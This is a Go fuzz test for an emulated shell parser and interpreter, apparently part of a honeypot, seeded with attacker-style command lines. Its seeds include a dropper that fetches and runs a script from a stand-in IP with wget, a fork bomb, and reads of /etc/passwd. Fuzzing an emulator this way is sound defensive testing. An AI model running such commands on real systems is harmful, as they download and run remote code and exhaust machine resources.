package shell

import (
	"io"
	"strings"
	"testing"
)

// Attacker lines go straight into the parser and interpreter; neither may
// panic or hang on any input.

var fuzzSeeds = []string{
	`cd /tmp || cd /var/run; wget http://198.51.100.23/bins.sh; chmod 777 bins.sh; sh bins.sh`,
	`X=$(uname -m); echo "arch:$X" ${X:-none} ${#X} ${X//_/-}`,
	`for i in 1 2 3; do echo $i; done; while read a; do :; done < /etc/passwd`,
	`if [ -d /tmp ]; then echo yes; elif false; then :; else echo no; fi`,
	`case $1 in a|b) echo ab;; *) echo other;; esac`,
	"cat <<EOF\n$HOME `id`\nEOF",
	`echo $((1+2*3)) $((x++)) {1..3} {a,b} ~root $'\x41' "${HOME#/}"`,
	`f(){ local x=1; return 2; }; f; echo $?; [[ -f /etc/passwd && $x == 1* ]]`,
	`ls /nonexistent 2>&1 >/dev/null | wc -l; exec 3>&1; echo >&3`,
	`:(){ :|:& };:`,
}

func FuzzParse(f *testing.F) {
	for _, s := range fuzzSeeds {
		f.Add(s)
	}
	f.Fuzz(func(t *testing.T, line string) {
		_, _ = Parse(line, exp())
		_ = Incomplete(line)
	})
}

func FuzzRun(f *testing.F) {
	for _, s := range fuzzSeeds {
		f.Add(s)
	}
	in, s := testSession(f)
	f.Fuzz(func(t *testing.T, line string) {
		if strings.Contains(line, "sleep") {
			return // capped at 3s per call, but slow to fuzz
		}
		sess := NewSession(s.Machine, "root", 1)
		in.Run(sess, line, strings.NewReader(""), io.Discard, io.Discard)
	})
}
